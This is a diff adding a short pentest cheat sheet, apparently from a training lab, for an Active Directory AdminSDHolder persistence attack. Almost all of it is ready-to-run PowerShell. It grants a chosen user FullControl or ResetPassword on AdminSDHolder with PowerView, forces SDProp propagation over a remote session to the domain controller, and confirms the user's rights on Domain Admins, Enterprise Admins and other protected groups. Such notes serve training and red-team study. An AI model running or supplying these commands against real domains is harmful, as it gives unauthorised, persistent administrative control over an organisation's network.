@@ -1,0 +1,39 @@
+The general goal of an AdminSDHolder attack is to apply changes to the object, in many cases this means changes to the ACL. This can take many forms, but commonly an attacker may choose to add accounts to this list, giving them the same amount of privilege as other protected accounts and groups already in the AdminSDHolder object.
+
+
+#First get DA
+Import-Module powerview.ps1
+
+
+----------Adding Permission-----------
+#Add FullControl permissions for a user to the AdminSDHolder using PowerView as DA:
+Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=pentesting,DC=local' -PrincipalIdentity student5 -Rights All -Verbose
+
+#Other interesting permissions (ResetPassword, WriteMembers)
+Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=pentesting,DC=local' -PrincipalIdentity student1 -Rights ResetPassword -Verbose
+
+
+----------Invoking SDpropagator--------------
+https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory
+
+#Create session to DC and load Invoke-SDPropagator.ps1 in the session
+$sess = New-PSSession -ComputerName dc.pentesting.local -credential student1
+Invoke-Command -FilePath .\Invoke-SDPropagator.ps1 -Session $sess
+Enter-PSSession -Session $sess
+
+
+#Invoke Invoke-SDPropagator.ps1 from the session
+Invoke-SDPropagator -ShowProgress -TimeoutMinutes 1 -Verbose
+
+
+--------------Check ACL Access------------
+#Check the Domain Admins Permission to see if our user is there now.
+#PowerView as normal user:
+Get-DomainObjectAcl -SamAccountName "domain admins" | ? {($_.SecurityIdentifier -match 'S-1-5-21-1070240333-336889418-1185445934-1607')}
+Get-DomainObjectAcl -SamAccountName "Domain Controllers" | ? {($_.SecurityIdentifier -match 'S-1-5-21-1070240333-336889418-1185445934-1607')}
+Get-DomainObjectAcl -SamAccountName "Enterprise Admins" | ? {($_.SecurityIdentifier -match 'S-1-5-21-1070240333-336889418-1185445934-1607')}
+Get-DomainObjectAcl -SamAccountName "Replicator" | ? {($_.SecurityIdentifier -match 'S-1-5-21-1070240333-336889418-1185445934-1607')}
+Get-DomainObjectAcl -SamAccountName "Schema Admins" | ? {($_.SecurityIdentifier -match 'S-1-5-21-1070240333-336889418-1185445934-1607')}
+
+
+
